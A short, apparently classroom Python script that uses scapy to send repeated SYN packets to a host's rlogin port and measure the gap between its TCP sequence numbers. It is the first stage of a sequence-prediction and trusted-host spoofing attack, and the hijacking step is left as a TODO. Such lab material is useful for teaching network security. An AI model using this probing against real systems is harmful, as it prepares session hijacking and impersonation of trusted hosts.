from scapy.all import *

import sys
import re
from statistics import mode

def detective(src):
	previous = 0
	seqs = []
	for i in range(20):
		ip = IP()
		ip.dst = src
		tcp = TCP()
		tcp.dport = 513
		tcp.flags = "S"
		resp = sr1(ip/tcp, verbose = 0)
		if(i!=0):
			seqs.append(resp[TCP].seq - previous)
		previous = resp[TCP].seq
	return mode(seqs)

if __name__ == "__main__":
	conf.iface = sys.argv[1]
	target_ip = sys.argv[2]
	trusted_host_ip = sys.argv[3]

	my_ip = get_if_addr(sys.argv[1])

	#TODO: figure out SYN sequence number pattern
	src = "10.4.61.25"
	seq_gap = detective(src)
	print(seq_gap)

	#TODO: TCP hijacking with predicted sequence number
